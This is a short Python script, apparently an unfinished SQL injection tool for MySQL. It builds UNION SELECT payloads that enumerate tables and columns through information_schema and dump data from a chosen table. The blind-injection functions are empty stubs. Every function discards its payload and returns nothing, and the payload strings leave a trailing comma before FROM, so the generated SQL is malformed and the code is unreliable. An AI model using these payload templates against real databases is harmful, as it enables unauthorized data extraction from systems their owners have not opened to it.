import requests
import sys
import string

# Return information in bound with returned response
def return_tables(payload, colcount, dbcontext="mysql"):
    sqlpayload = f'''{payload} UNION SELECT table_name, {'NULL,'*colcount} FROM information_schema.tables WHERE table_schema=database()-- -'''
    return
def return_columns(payload, table, colcount, dbcontext="mysql"):
    sqlpayload = f'''{payload} UNION SELECT column_name, {'NULL,'*colcount} FROM information_schema.columns WHERE table_name='{table}'-- -'''
    return
def return_data(payload, table, column, colcount, dbcontext="mysql"):
    sqlpayload = f'''{payload} UNION SELECT {column}, {'NULL,'*colcount} FROM {table}-- -'''
    return

# return information in bound with limited/no response
def return_tables_blind(payload, dbcontext="mysql"):
    return
def return_columns_blind(payload, table, dbcontext="mysql", mode="bool"):
    return
def return_data_blind(payload, table, column, dbcontext="mysql", mode="bool"):
    return

